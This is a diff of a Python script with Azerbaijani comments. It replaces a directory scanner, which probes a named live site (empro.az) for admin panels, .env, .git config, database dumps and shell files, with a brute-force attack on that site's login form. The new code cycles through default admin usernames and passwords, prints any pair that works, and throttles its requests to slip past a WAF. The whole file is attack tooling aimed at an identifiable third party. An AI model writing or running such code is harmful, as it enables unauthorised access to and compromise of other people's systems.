@@ -1,53 +1,61 @@
 import asyncio
 import httpx
-import random
 
-TARGET = "https://empro.az" # Hədəf sayt
+TARGET_LOGIN_URL = "https://empro.az/login" # Tapdığın qapı
 
-# Hack üçün ən kritik qovluq və fayl siyahısı (Wordlist)
-PATHS = [
-    "/admin", "/admin/", "/login", "/administrator", "/wp-login.php", 
-    "/cp", "/cpanel", "/webmail", "/config.php", "/config.php.bak",
-    "/.env", "/.git/config", "/db.sql", "/database.sql", "/backup.zip",
-    "/phpmyadmin", "/sql", "/upload.php", "/shell.php", "/api/v1/user",
-    "/server-status", "/info.php", "robots.txt", "/sitemap.xml"
+# Sınaq üçün ən çox yayılmış laboratoriya kombinasiyaları
+USERS = ["admin", "administrator", "staff", "manager"]
+PASSWORDS = [
+    "admin123", "admin12345", "password", "123456", "qwerty", 
+    "root", "admin@123", "superuser", "admin2024", "admin2025"
 ]
 
-async def scan(path, client):
-    url = f"{TARGET}{path}"
-    headers = {
-        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
-        "Accept": "*/*"
+async def attempt_login(username, password, client):
+    # Saytın daxili login forması üçün data
+    # QEYD: Saytın formundakı 'name' sahələrinə görə bu datanı optimallaşdırırıq
+    login_data = {
+        "email": username, # Bəzi saytlarda istifadəçi adı, bəzilərində email olur
+        "password": password,
+        "login": "submit"
     }
     
-    try:
-        # Cloudflare bypass üçün 5-10 saniyəlik timeout
-        response = await client.get(url, headers=headers, follow_redirects=True, timeout=10)
-        
-        # Əgər status 200 (Uğurlu) və ya 403 (Qadağan amma mövcud) olsa
-        if response.status_code == 200:
-            print(f"✅ [SUCCESS] Qapı tapıldı: {url} (Status: 200)")
-            # Burada 'admin' və ya 'login' sözü keçirsə qeyd et
-            if "login" in response.text.lower() or "user" in response.text.lower():
-                 print(f"   🚩 [CRITICAL] Bu bir giriş panelidir!")
-        
-        elif response.status_code == 403:
-            print(f"🚫 [FORBIDDEN] {url} (Status: 403) - Qorunur amma orada fayl var!")
+    headers = {
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
+        "Referer": TARGET_LOGIN_URL
+    }
 
+    try:
+        response = await client.post(TARGET_LOGIN_URL, data=login_data, headers=headers, follow_redirects=False)
+        
+        # Əgər status 302 (Yönləndirmə) olsa, bu çox vaxt uğurlu giriş deməkdir
+        if response.status_code == 302 or (response.status_code == 200 and "dashboard" in response.text.lower()):
+            print(f"\n🔥 [SUCCESS] GİRİŞ ƏLDƏ EDİLDİ!")
+            print(f"🚩 USERNAME: {username}")
+            print(f"🚩 PASSWORD: {password}")
+            print(f"🔗 DASHBOARD: {response.headers.get('Location', 'Login successful')}")
+            return True
+        else:
+            print(f"[-] Uğursuz cəhd: {username}:{password}", end="\r")
     except Exception:
         pass
+    return False
 
 async def main():
-    print(f"🕵️  SIZMA TESTİ ÜÇÜN KƏŞFİYYAT BAŞLADI: {TARGET}")
-    print(f"[*] Cəmi {len(PATHS)} kritik nöqtə yoxlanılır...\n")
+    print(f"⚒️  ADMIN PANELƏ SIZMA CƏHDİ BAŞLADI: {TARGET_LOGIN_URL}")
+    print(f"[*] Cəmi {len(USERS) * len(PASSWORDS)} kombinasiya yoxlanılır...\n")
     
-    limits = httpx.Limits(max_connections=20)
-    async with httpx.AsyncClient(limits=limits, http2=True, verify=False) as client:
-        # Axtarışı sürətləndirmək üçün asinxron işə salırıq
-        tasks = [scan(p, client) for p in PATHS]
-        await asyncio.gather(*tasks)
-    
-    print(f"\n[!] Kəşfiyyat bitdi. Tapılan nöqtələr üzərindən sızmağa başlayın.")
+    async with httpx.AsyncClient(verify=False) as client:
+        found = False
+        for user in USERS:
+            if found: break
+            for pwd in PASSWORDS:
+                if await attempt_login(user, pwd, client):
+                    found = True
+                    break
+                await asyncio.sleep(0.1) # WAF bloklamasın deyə qısa fasilə
+        
+        if not found:
+            print("\n\n[!] Standart şifrələrlə giriş alınmadı. Daha iri lüğət (wordlist) lazımdır.")
 
 if __name__ == "__main__":
     asyncio.run(main())
